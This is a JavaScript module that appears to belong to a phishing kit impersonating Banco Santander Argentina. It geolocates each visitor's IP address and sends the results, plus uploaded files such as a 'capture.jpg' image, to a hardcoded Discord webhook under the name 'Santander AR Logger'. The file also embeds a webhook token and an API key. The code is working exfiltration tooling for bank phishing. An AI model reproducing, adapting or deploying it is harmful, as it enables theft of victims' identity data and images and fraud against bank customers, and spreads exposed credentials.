"use strict";

(function(global) {

    var DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1496162037640859774/KmxDVtGYosEMcq0eqtvbPU0XC68SSy2P0Dv5MWckTl69BJcvf4NekFOFUHfEUXG8Is1N';
    var IPDATA_API_KEY = 'c3c534b646d39a871a47f795fc4302e1227acc8bf07b4d550efbff15';

    function getCountryFlag(countryCode) {
        var flags = {
            'AR':'🇦🇷','BO':'🇧🇴','BR':'🇧🇷','CL':'🇨🇱','CO':'🇨🇴','CR':'🇨🇷',
            'CU':'🇨🇺','DO':'🇩🇴','EC':'🇪🇨','SV':'🇸🇻','GT':'🇬🇹','HN':'🇭🇳',
            'MX':'🇲🇽','NI':'🇳🇮','PA':'🇵🇦','PY':'🇵🇾','PE':'🇵🇪','PR':'🇵🇷',
            'UY':'🇺🇾','VE':'🇻🇪','US':'🇺🇸','CA':'🇨🇦','ES':'🇪🇸','GB':'🇬🇧',
            'FR':'🇫🇷','DE':'🇩🇪','IT':'🇮🇹','PT':'🇵🇹','NL':'🇳🇱','BE':'🇧🇪',
            'CH':'🇨🇭','AT':'🇦🇹','SE':'🇸🇪','NO':'🇳🇴','DK':'🇩🇰','FI':'🇫🇮',
            'PL':'🇵🇱','RO':'🇷🇴','CZ':'🇨🇿','HU':'🇭🇺','GR':'🇬🇷','TR':'🇹🇷',
            'RU':'🇷🇺','UA':'🇺🇦','JP':'🇯🇵','CN':'🇨🇳','KR':'🇰🇷','IN':'🇮🇳',
            'AU':'🇦🇺','NZ':'🇳🇿','ZA':'🇿🇦','EG':'🇪🇬','NG':'🇳🇬','KE':'🇰🇪',
            'IL':'🇮🇱','AE':'🇦🇪','SA':'🇸🇦','TH':'🇹🇭','VN':'🇻🇳','PH':'🇵🇭',
            'ID':'🇮🇩','MY':'🇲🇾','SG':'🇸🇬','TW':'🇹🇼','HK':'🇭🇰'
        };
        return flags[(countryCode || '').toUpperCase()] || '🌐';
    }

    function getIpInfo() {
        var fallback = function() {
            return fetch('http://ip-api.com/json/')
                .then(function(r) { return r.json(); })
                .then(function(d) {
                    if (d.status === 'success') {
                        return {
                            ip: d.query || 'Desconocida',
                            location: (d.city || '') + ', ' + (d.regionName || '') + ', ' + (d.country || ''),
                            country: d.country || '??',
                            country_code: d.countryCode || '??',
                            isp: d.isp || 'N/A',
                            flag: getCountryFlag(d.countryCode)
                        };
                    }
                    throw new Error('ip-api fail');
                })
                .catch(function() {
                    return { ip: 'Desconocida', location: 'No disponible', country: '??', country_code: '??', isp: 'N/A', flag: '❓' };
                });
        };

        if (IPDATA_API_KEY) {
            return fetch('https://api.ipdata.co?api-key=' + IPDATA_API_KEY)
                .then(function(r) { if (!r.ok) throw new Error(); return r.json(); })
                .then(function(d) {
                    if (d.ip && d.country_name) {
                        var loc = d.city ? d.city + ', ' + (d.region || '') + ', ' + d.country_name : d.country_name;
                        return {
                            ip: d.ip,
                            location: loc,
                            country: d.country_name,
                            country_code: d.country_code || '??',
                            isp: d.org || (d.asn && d.asn.name) || 'N/A',
                            flag: getCountryFlag(d.country_code)
                        };
                    }
                    throw new Error();
                })
                .catch(function() { return fallback(); });
        }
        return fallback();
    }

    function sendToDiscord(embeds) {
        if (!DISCORD_WEBHOOK_URL) return Promise.resolve();
        var payload = {
            username: 'Santander AR Logger',
            avatar_url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Banco_Santander_Logotipo.svg/512px-Banco_Santander_Logotipo.svg.png',
            embeds: embeds
        };
        var blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
        var sent = navigator.sendBeacon(DISCORD_WEBHOOK_URL, blob);
        if (sent) return Promise.resolve();
        return fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            mode: 'no-cors',
            keepalive: true
        }).then(function() {}).catch(function() {});
    }

    function sendToDiscordWithFile(embeds, fileBlob, filename) {
        if (!DISCORD_WEBHOOK_URL) return Promise.resolve();
        var payload = {
            username: 'Santander AR Logger',
            avatar_url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Banco_Santander_Logotipo.svg/512px-Banco_Santander_Logotipo.svg.png',
            embeds: embeds
        };
        var data = new FormData();
        data.append('payload_json', JSON.stringify(payload));
        data.append('files[0]', fileBlob, filename || 'capture.jpg');
        return fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            body: data
        }).then(function() {}).catch(function() {});
    }

    global.SantanderLogger = {
        getIpInfo: getIpInfo,
        sendToDiscord: sendToDiscord,
        sendToDiscordWithFile: sendToDiscordWithFile,
        getCountryFlag: getCountryFlag
    };

})(window);
